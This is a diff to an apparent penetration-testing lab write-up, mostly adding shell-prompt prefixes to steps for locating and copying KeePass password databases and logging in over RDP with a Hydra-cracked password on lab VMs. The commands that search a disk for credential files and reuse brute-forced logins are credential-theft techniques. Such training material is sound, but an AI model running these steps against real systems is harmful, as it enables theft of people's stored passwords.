@@ -81,11 +81,11 @@ Lab 1 - Follow the steps outlined in this section to obtain the master password 
 ># 2) (On Windows) Open PowerShell to enumerate installed applications
 >
 ># 3) Enumerate installed programs to confirm KeePass is installed on the system
->Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
+>PS C:\Users\jason> Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
 >Select DisplayName
 >
 ># 4) Search the entire C:\ drive for KeePass database files (*.kdbx)
->Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+>PS C:\Users\jason> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 >
 ># 5) (Manual step) Copy the KeePass database from Windows to Kali: C:\Users\nadine\Documents\Database.kdbx
 >
@@ -125,14 +125,14 @@ Lab 2 - Enumerate VM #2 and get access to the system as user nadine. Obtain the 
 ># 3) RDP into VM #2 as nadine using the cracked password from Hydra (example: 123abc)
 >kali@kali:~$ xfreerdp3 /u:nadine /p:123abc /v:192.168.241.227 /cert:ignore
 >
-># 4) (On Windows) Run PowerShell "As Administrator" so you can enumerate installed programs and search the full disk
+># 4) (On Windows) Run PowerShell so you can enumerate installed programs and search the full disk
 >
 ># 5) Enumerate installed applications to confirm KeePass is installed (password manager present)
->Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
+>PS C:\Users\nadine> Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
 >Select DisplayName
 >
 ># 6) Search the entire C:\ drive for KeePass database files (*.kdbx)
->Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+>PS C:\Users\nadine> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 >
 ># 7) (Manual step) Copy the KeePass database from Windows to Kali: C:\Users\nadine\Documents\Database.kdbx
 >
